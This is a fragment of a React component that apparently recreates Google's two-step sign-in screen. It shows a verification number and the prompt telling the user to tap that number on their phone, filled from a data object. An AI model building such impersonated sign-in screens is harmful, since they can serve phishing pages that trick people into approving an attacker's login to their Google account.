...
export default function MobileCode() {
	...
	return (
		<form onSubmit={() => {}} className={styles.form}>
			...
			<div className={styles.code}>{data?.phoneCode}</div>
			<h2>Check your {data?.phoneName}</h2>
			<h3>
				Google sent a notification to your <strong>{data?.phoneName}</strong>. Tap Yes on the notification, then tap <strong>{data?.phoneCode}</strong> on your phone to verify it’s
				you.
			</h3>
